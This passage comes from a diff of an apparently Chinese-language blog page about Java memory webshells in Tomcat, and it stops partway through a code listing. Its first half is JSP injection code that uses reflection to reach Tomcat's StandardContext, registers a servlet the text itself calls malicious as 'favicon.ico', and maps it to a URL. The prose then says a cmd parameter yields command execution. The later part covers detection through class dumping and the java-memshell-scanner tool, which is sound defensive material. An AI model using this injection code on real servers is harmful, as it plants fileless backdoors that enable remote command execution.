+            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt; &lt;span class="n"&gt;thread&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;threads&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;contains&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Acceptor&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;contains&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;http&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;)))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;target&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;HashMap&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;jioEndPoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="n"&gt;jioEndPoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;this$0&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;){}&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;jioEndPoint&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;
+                        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;
+                            &lt;span class="n"&gt;jioEndPoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;endpoint&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                        &lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;jioEndPoint&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;handler&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;proto&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;adapter&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;connector&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;service&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;StandardEngine&lt;/span&gt; &lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+                        &lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;StandardEngine&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;container&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;){}&lt;/span&gt;
+                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;
+                        &lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;StandardEngine&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;engine&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+
+                    &lt;span class="n"&gt;children&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;children&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;StandardHost&lt;/span&gt; &lt;span class="n"&gt;standardHost&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;StandardHost&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;serverName&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+
+                    &lt;span class="n"&gt;children&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HashMap&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;getField&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;standardHost&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;children&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                    &lt;span class="n"&gt;Iterator&lt;/span&gt; &lt;span class="n"&gt;iterator&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;keySet&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;iterator&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;iterator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hasNext&lt;/span&gt;&lt;span class="o"&gt;()){&lt;/span&gt;
+                        &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;contextKey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;iterator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;next&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(!(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;uri&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;startsWith&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;contextKey&lt;/span&gt;&lt;span class="o"&gt;))){&lt;/span&gt;&lt;span class="k"&gt;continue&lt;/span&gt;&lt;span class="o"&gt;;}&lt;/span&gt;
+                        &lt;span class="n"&gt;StandardContext&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;StandardContext&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;children&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;contextKey&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
+                        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;standardContext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                        &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+                    &lt;span class="o"&gt;}&lt;/span&gt;
+                &lt;span class="o"&gt;}&lt;/span&gt;
+            &lt;span class="o"&gt;}&lt;/span&gt;
+        &lt;span class="o"&gt;}&lt;/span&gt;
+        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;StandardContext&lt;/span&gt; &lt;span class="nf"&gt;getSTC&lt;/span&gt;&lt;span class="o"&gt;(){&lt;/span&gt;
+            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;standardContext&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
+        &lt;span class="o"&gt;}&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+    &lt;span class="n"&gt;Tomcat6789&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tomcat6789&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+    &lt;span class="n"&gt;StandardContext&lt;/span&gt; &lt;span class="n"&gt;standardCtx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSTC&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
+&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="将恶意servlet封装成wrapper添加到standardcontext的children当中"&gt;将恶意servlet封装成wrapper添加到StandardContext的children当中&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;  
+    &lt;span class="c1"&gt;// 用Wrapper对其进行封装  
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;apache&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;catalina&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Wrapper&lt;/span&gt; &lt;span class="n"&gt;newWrapper&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;standardCtx&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;createWrapper&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;  
+    &lt;span class="n"&gt;newWrapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setName&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;favicon.ico&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  
+    &lt;span class="n"&gt;newWrapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setLoadOnStartup&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  
+    &lt;span class="n"&gt;newWrapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servlet&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  
+    &lt;span class="n"&gt;newWrapper&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setServletClass&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;servlet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getClass&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getName&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;  
+  
+    &lt;span class="c1"&gt;// 添加封装后的恶意Wrapper到StandardContext的children中  
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="n"&gt;standardCtx&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;addChild&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;newWrapper&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  
+
+&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;  
+  
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;  
+&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="添加servletmapping将访问的url和wrapper进行绑定"&gt;添加ServletMapping将访问的URL和wrapper进行绑定&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span class="o"&gt;&amp;lt;%&lt;/span&gt;
+	  
+    &lt;span class="c1"&gt;// 添加ServletMapping到将访问的URL和Servlet进行绑定  
+&lt;/span&gt;&lt;span class="c1"&gt;&lt;/span&gt;    &lt;span class="n"&gt;standardCtx&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;addServletMappingDecoded&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;/favicon.ico&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;favicon.ico&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  
+
+&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。&lt;/p&gt;
+&lt;h1 id="内存马检测与排查"&gt;内存马检测与排查&lt;/h1&gt;
+&lt;h2 id="源码检测"&gt;源码检测&lt;/h2&gt;
+&lt;p&gt;在Java中，只有被JVM加载/或在需要时通过反射通知JVM加载的类才能被调用。所有的特征都在内存中，表现形式为被加载的class，需要通过某种方法获取到JVM运行时内存中已加载的类。&lt;br /&gt;
+Java本身提供了Instrumentation类来实现&lt;br /&gt;
+实现思路：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注入jar包 &amp;ndash;&amp;gt;dump已加载class字节码 &amp;ndash;&amp;gt; 反编译成java代码 &amp;ndash;&amp;gt; 源码webshell检测&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;检测判定：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;新增或修改的类&lt;/li&gt;
+&lt;li&gt;没有对应class文件的类&lt;/li&gt;
+&lt;li&gt;xml配置中没有注册的&lt;/li&gt;
+&lt;li&gt;冰蝎等常见工具使用的类&lt;/li&gt;
+&lt;li&gt;filterchain中排第一的filter类&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;有一些工具可以辅助检测内存马，如&lt;a href="https://github.com/c0ny1/java-memshell-scanner" target="_blank"&gt;java-memshell-scanner&lt;/a&gt;是通过jsp扫描应用中所有的filter和servlet，然后通过名称、对应的class是否存在来判断是否是内存马。&lt;/p&gt;
+&lt;h3 id="内存马检测java-memshell-scanner"&gt;内存马检测java-memshell-scanner&lt;/h3&gt;
+&lt;p&gt;创建memshell-scanner.jsp&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;  1
+&lt;/span&gt;&lt;span class="lnt"&gt;  2
+&lt;/span&gt;&lt;span class="lnt"&gt;  3
+&lt;/span&gt;&lt;span class="lnt"&gt;  4
+&lt;/span&gt;&lt;span class="lnt"&gt;  5
+&lt;/span&gt;&lt;span class="lnt"&gt;  6
+&lt;/span&gt;&lt;span class="lnt"&gt;  7
+&lt;/span&gt;&lt;span class="lnt"&gt;  8
+&lt;/span&gt;&lt;span class="lnt"&gt;  9
+&lt;/span&gt;&lt;span class="lnt"&gt; 10
+&lt;/span&gt;&lt;span class="lnt"&gt; 11
+&lt;/span&gt;&lt;span class="lnt"&gt; 12
+&lt;/span&gt;&lt;span class="lnt"&gt; 13
+&lt;/span&gt;&lt;span class="lnt"&gt; 14
+&lt;/span&gt;&lt;span class="lnt"&gt; 15
+&lt;/span&gt;&lt;span class="lnt"&gt; 16
+&lt;/span&gt;&lt;span class="lnt"&gt; 17
+&lt;/span&gt;&lt;span class="lnt"&gt; 18
+&lt;/span&gt;&lt;span class="lnt"&gt; 19
+&lt;/span&gt;&lt;span class="lnt"&gt; 20
+&lt;/span&gt;&lt;span class="lnt"&gt; 21
+&lt;/span&gt;&lt;span class="lnt"&gt; 22
+&lt;/span&gt;&lt;span class="lnt"&gt; 23
+&lt;/span&gt;&lt;span class="lnt"&gt; 24
+&lt;/span&gt;&lt;span class="lnt"&gt; 25
+&lt;/span&gt;&lt;span class="lnt"&gt; 26
+&lt;/span&gt;&lt;span class="lnt"&gt; 27
+&lt;/span&gt;&lt;span class="lnt"&gt; 28
+&lt;/span&gt;&lt;span class="lnt"&gt; 29
+&lt;/span&gt;&lt;span class="lnt"&gt; 30
+&lt;/span&gt;&lt;span class="lnt"&gt; 31
+&lt;/span&gt;&lt;span class="lnt"&gt; 32
+&lt;/span&gt;&lt;span class="lnt"&gt; 33
+&lt;/span&gt;&lt;span class="lnt"&gt; 34
+&lt;/span&gt;&lt;span class="lnt"&gt; 35
+&lt;/span&gt;&lt;span class="lnt"&gt; 36
+&lt;/span&gt;&lt;span class="lnt"&gt; 37
+&lt;/span&gt;&lt;span class="lnt"&gt; 38
+&lt;/span&gt;&lt;span class="lnt"&gt; 39
+&lt;/span&gt;&lt;span class="lnt"&gt; 40
+&lt;/span&gt;&lt;span class="lnt"&gt; 41
+&lt;/span&gt;&lt;span class="lnt"&gt; 42
+&lt;/span&gt;&lt;span class="lnt"&gt; 43
+&lt;/span&gt;&lt;span class="lnt"&gt; 44
+&lt;/span&gt;&lt;span class="lnt"&gt; 45
+&lt;/span&gt;&lt;span class="lnt"&gt; 46
+&lt;/span&gt;&lt;span class="lnt"&gt; 47
+&lt;/span&gt;&lt;span class="lnt"&gt; 48
+&lt;/span&gt;&lt;span class="lnt"&gt; 49
+&lt;/span&gt;&lt;span class="lnt"&gt; 50
+&lt;/span&gt;&lt;span class="lnt"&gt; 51
+&lt;/span&gt;&lt;span class="lnt"&gt; 52
+&lt;/span&gt;&lt;span class="lnt"&gt; 53
+&lt;/span&gt;&lt;span class="lnt"&gt; 54
+&lt;/span&gt;&lt;span class="lnt"&gt; 55
+&lt;/span&gt;&lt;span class="lnt"&gt; 56
+&lt;/span&gt;&lt;span class="lnt"&gt; 57
+&lt;/span&gt;&lt;span class="lnt"&gt; 58
+&lt;/span&gt;&lt;span class="lnt"&gt; 59
+&lt;/span&gt;&lt;span class="lnt"&gt; 60
+&lt;/span&gt;&lt;span class="lnt"&gt; 61
+&lt;/span&gt;&lt;span class="lnt"&gt; 62
+&lt;/span&gt;&lt;span class="lnt"&gt; 63
+&lt;/span&gt;&lt;span class="lnt"&gt; 64
+&lt;/span&gt;&lt;span class="lnt"&gt; 65
+&lt;/span&gt;&lt;span class="lnt"&gt; 66
+&lt;/span&gt;&lt;span class="lnt"&gt; 67
+&lt;/span&gt;&lt;span class="lnt"&gt; 68
+&lt;/span&gt;&lt;span class="lnt"&gt; 69
+&lt;/span&gt;&lt;span class="lnt"&gt; 70
+&lt;/span&gt;&lt;span class="lnt"&gt; 71
+&lt;/span&gt;&lt;span class="lnt"&gt; 72
+&lt;/span&gt;&lt;span class="lnt"&gt; 73
+&lt;/span&gt;&lt;span class="lnt"&gt; 74
+&lt;/span&gt;&lt;span class="lnt"&gt; 75
+&lt;/span&gt;&lt;span class="lnt"&gt; 76
+&lt;/span&gt;&lt;span class="lnt"&gt; 77
+&lt;/span&gt;&lt;span class="lnt"&gt; 78
+&lt;/span&gt;&lt;span class="lnt"&gt; 79
+&lt;/span&gt;&lt;span class="lnt"&gt; 80
+&lt;/span&gt;&lt;span class="lnt"&gt; 81
+&lt;/span&gt;&lt;span class="lnt"&gt; 82
+&lt;/span&gt;&lt;span class="lnt"&gt; 83
+&lt;/span&gt;&lt;span class="lnt"&gt; 84
+&lt;/span&gt;&lt;span class="lnt"&gt; 85
+&lt;/span&gt;&lt;span class="lnt"&gt; 86
+&lt;/span&gt;&lt;span class="lnt"&gt; 87
+&lt;/span&gt;&lt;span class="lnt"&gt; 88
+&lt;/span&gt;&lt;span class="lnt"&gt; 89
+&lt;/span&gt;&lt;span class="lnt"&gt; 90
+&lt;/span&gt;&lt;span class="lnt"&gt; 91
+&lt;/span&gt;&lt;span class="lnt"&gt; 92
+&lt;/span&gt;&lt;span class="lnt"&gt; 93
+&lt;/span&gt;&lt;span class="lnt"&gt; 94
+&lt;/span&gt;&lt;span class="lnt"&gt; 95
+&lt;/span&gt;&lt;span class="lnt"&gt; 96
+&lt;/span&gt;&lt;span class="lnt"&gt; 97
+&lt;/span&gt;&lt;span class="lnt"&gt; 98
+&lt;/span&gt;&lt;span class="lnt"&gt; 99
+&lt;/span&gt;&lt;span class="lnt"&gt;100
+&lt;/span&gt;&lt;span class="lnt"&gt;101
+&lt;/span&gt;&lt;span class="lnt"&gt;102
+&lt;/span&gt;&lt;span class="lnt"&gt;103
+&lt;/span&gt;&lt;span class="lnt"&gt;104
+&lt;/span&gt;&lt;span class="lnt"&gt;105
